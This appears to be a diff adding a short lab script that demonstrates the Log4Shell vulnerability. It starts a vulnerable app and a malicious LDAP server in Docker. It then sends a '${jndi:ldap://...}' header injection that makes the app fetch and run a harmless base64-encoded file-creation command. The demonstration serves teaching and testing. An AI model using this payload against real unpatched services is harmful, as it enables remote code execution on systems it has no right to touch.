@@ -1,0 +1,10 @@
+docker network create log4jnetwork
+
+docker run --rm --network log4jnetwork --name vulnap -p 80:8080 vulnapp
+docker exec vulnap ls /tmp
+
+docker run --rm --network log4jnetwork --name log4jldapserver -p 1389:1389 -p 8888:8888 cygenta/log4jldap
+
+curl.exe 127.0.0.1:80 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
+
+docker exec vulnap ls /tmp
